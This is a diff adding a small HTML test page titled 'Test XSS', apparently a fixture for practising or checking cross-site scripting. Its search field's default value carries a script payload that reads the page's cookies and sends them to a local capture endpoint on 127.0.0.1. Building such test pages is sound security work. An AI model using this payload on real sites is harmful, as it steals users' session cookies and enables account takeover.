@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Test XSS</title>
+    </head>
+    <body>
+        <form action="" method="GET">
+            <input type="text" id="search" name="searchFor" value="<script>var img = new Image(); img.src = 'http://127.0.0.1:5000/capture?data=' + encodeURIComponent(document.cookie);</script>">
+            <button type="submit">Search</button>
+        </form>
+    </body>
+</html>
